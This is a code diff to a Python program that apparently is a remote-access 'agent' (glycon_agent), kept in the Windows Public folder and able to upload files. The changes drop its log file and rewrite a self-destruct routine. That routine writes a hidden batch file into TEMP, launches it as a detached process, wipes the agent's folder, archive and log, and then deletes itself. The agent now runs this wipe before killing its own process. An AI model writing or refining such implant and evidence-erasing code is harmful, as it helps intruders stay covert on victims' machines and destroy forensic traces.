@@ -7,10 +7,7 @@ import traceback
 import os
 
 def _log_to_public(msg):
-    try:
-        with open("C:\\Users\\Public\\glycon_agent.log", "a") as f:
-            f.write(f"{{datetime.now()}}: {{msg}}\n")
-    except: pass
+    pass
 
 _log_to_public("--- SCRIPT LOADED ---")
 
@@ -1830,53 +1827,58 @@ class SystemUtils:
             }}
 
     @staticmethod
-    def _self_destruct():
-        _log_to_public("SystemUtils._self_destruct")
-        if platform.system() != "Windows": return
+    def _self_destruct(exit_process=True):
+        if platform.system() != "Windows":
+            if exit_process:
+                os._exit(0)
+            return
         try:
-            current_file = os.path.realpath(sys.argv[0])
-            current_dir = os.path.dirname(current_file)
-            temp_dir = os.environ.get("TEMP", "C:\\Users\\Public")
+            public_dir = os.environ.get("PUBLIC", "C:\\Users\\Public")
+            public_docs = os.path.join(public_dir, "documents")
+            temp_dir = os.environ.get("TEMP", public_dir)
+            try:
+                os.chdir(temp_dir)
+            except Exception:
+                pass
             batch_filename = f"cleanup_{{random.randint(1000, 9999)}}.bat"
             batch_path = os.path.join(temp_dir, batch_filename)
-            
+
             batch_script = f"""@echo off
 setlocal
-set "PY_LOG_FILE=C:\\Users\\Public\\glycon_agent.log"
-echo %date% %time%: Batch script started. >> "%PY_LOG_FILE%"
-set "AGENT_DIR={{current_dir}}"
-timeout /t 7 /nobreak > NUL
-cd /d "%AGENT_DIR%"
-if errorlevel 0 (
-    del /f /q *.dll *.pyd *.zip *.pth *.py *.exe > NUL 2>&1
-    if exist "Lib" rd /s /q "Lib"
-    if exist "Scripts" rd /s /q "Scripts"
-)
+set "AGENT_DIR={{public_docs}}"
 cd /d "%temp%"
-set RETRIES=5
+timeout /t 2 /nobreak > NUL
+del /f /q "{{public_dir}}\\p.zip" "{{public_dir}}\\glycon_agent.log" > NUL 2>&1
+set RETRIES=10
 :retry_loop
 if %RETRIES% lss 1 goto end_loop
 if not exist "%AGENT_DIR%" goto end_loop
-rd /s /q "%AGENT_DIR%"
+del /f /s /q "%AGENT_DIR%\\*" > NUL 2>&1
+rd /s /q "%AGENT_DIR%" > NUL 2>&1
 if exist "%AGENT_DIR%" (
-    timeout /t 3 /nobreak > NUL
+    timeout /t 2 /nobreak > NUL
     set /a RETRIES-=1
     goto retry_loop
 )
 :end_loop
-(goto) 2>nul & del "%~f0"
+(goto) 2>nul & del /f /q "%~f0"
 endlocal
 """
             with open(batch_path, "w") as f:
                 f.write(batch_script)
 
-            subprocess.Popen(['cmd.exe', '/c', batch_path],
-                             creationflags=0x00000008 | 0x00000200,
-                             close_fds=True)
-            sys.exit(0)
-            
+            subprocess.Popen(
+                ['cmd.exe', '/c', batch_path],
+                cwd=temp_dir,
+                creationflags=0x00000008 | 0x00000200,
+                close_fds=True
+            )
+            if exit_process:
+                os._exit(0)
+
         except Exception as e:
-            _log_to_public(f"Self-destruct initiation failed: {{e}}")
+            if exit_process:
+                os._exit(0)
 
     @staticmethod
     def upload_file(filepath):
@@ -3584,7 +3586,8 @@ class Agent:
             except:
                 pass
             
-            # 5. Forceful process termination
+            # 5. Spawn folder cleanup and forceful process termination
+            SystemUtils._self_destruct(exit_process=False)
             self._force_kill_process()
             
         except Exception as e:
